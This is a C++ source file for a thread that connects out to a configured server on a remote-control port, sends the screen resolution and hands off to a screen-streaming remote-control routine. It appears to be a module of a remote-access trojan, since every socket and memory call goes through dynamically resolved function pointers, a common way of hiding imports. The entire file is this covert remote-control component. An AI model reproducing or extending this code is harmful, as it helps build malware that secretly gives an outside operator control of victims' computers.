
#include <windows.h>
#include "RemoteControlProc.h"

#include "../log.h"


DWORD __stdcall RemoteControl(LPVOID)
{
	try {
		int iRet = 0;
		SOCKET hSock = lpsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (hSock == SOCKET_ERROR)
		{
			writeLog("RemoteControlProc lpsocket error:%d\r\n", GetLastError());
			return FALSE;
		}
		DWORD dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock, SOL_SOCKET, SO_SNDTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
		{
			writeLog("RemoteControlProc lpsetsockopt SO_SNDTIMEO error:%d\r\n", GetLastError());
			lpclosesocket(hSock);
			return FALSE;
		}

		dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
		{
			writeLog("RemoteControlProc lpsetsockopt SO_RCVTIMEO error:%d\r\n", GetLastError());
			lpclosesocket(hSock);
			return FALSE;
		}

		sockaddr_in stServRemoteCtrlAddr = { 0 };
		lpRtlZeroMemory((char*)&stServRemoteCtrlAddr, sizeof(sockaddr_in));
		stServRemoteCtrlAddr.sin_addr.S_un.S_addr = gServerIP;
		stServRemoteCtrlAddr.sin_port = lpntohs(NETWORK_REMOTECTRLPORT);
		stServRemoteCtrlAddr.sin_family = AF_INET;
		iRet = lpconnect(hSock, (sockaddr*)&stServRemoteCtrlAddr, sizeof(sockaddr_in));
		if (iRet == SOCKET_ERROR)
		{
			lpclosesocket(hSock);
			writeLog("RemoteControlProc lpconnect error:%d\r\n", GetLastError());
			return FALSE;
		}


		char* lpBuf = new char[REMOTECONTROL_BUFFER_SIZE];
		if (lpBuf == 0)
		{
			lpclosesocket(hSock);
			writeLog("RemoteControlProc new buf error:%d\r\n", GetLastError());
			return FALSE;
		}

		int zlibBufSize = REMOTECONTROL_BUFFER_SIZE / 2;
		char* lpZlibBuf = new char[zlibBufSize];
		if (lpZlibBuf == 0)
		{
			lpclosesocket(hSock);
			delete[] lpBuf;
			writeLog("RemoteControlProc new buf error:%d\r\n", GetLastError());
			return FALSE;
		}

		char* lpBackup = new char[REMOTECONTROL_BUFFER_SIZE];
		if (lpBackup == 0)
		{
			lpclosesocket(hSock);
			delete[] lpBuf;
			delete[]lpZlibBuf;
			writeLog("RemoteControlProc new buf error:%d\r\n", GetLastError());
			return FALSE;
		}

		STREMOTECONTROLPARAMS param = { ScrnResolutionX,ScrnResolutionY,REMOTEBMP_BITSPERPIXEL };
		iRet = SendCmdPacketWithParam(hSock, REMOTECONTROL_PARAMS, (char*)&param, sizeof(STREMOTECONTROLPARAMS));
		if (iRet <= 0)
		{
			lpclosesocket(hSock);
			delete[]lpZlibBuf;
			delete[] lpBuf;
			delete[]lpBackup;
			writeLog("RemoteControlProc SendCmdPacket error:%d\r\n", GetLastError());
			return FALSE;
		}

		iRet = RecvCmdPacket(hSock);
		if (iRet <= 0 || iRet != RECV_DATA_OK)
		{
			lpclosesocket(hSock);
			delete[]lpZlibBuf;
			delete[] lpBuf;
			delete[]lpBackup;
			writeLog("RemoteControlProc RecvCmdPacket error:%d\r\n", GetLastError());
			return FALSE;
		}

		iRet = RemoteControlProc(REMOTEBMP_BITSPERPIXEL, lpBuf, REMOTECONTROL_BUFFER_SIZE, lpZlibBuf, zlibBufSize, hSock, lpBackup);

		delete[]lpBuf;
		delete[]lpZlibBuf;
		delete[]lpBackup;
		lpclosesocket(hSock);
		return FALSE;
	}
	catch (...) {
		writeLog("RemoteControl exception\r\n");
		return FALSE;
	}
}
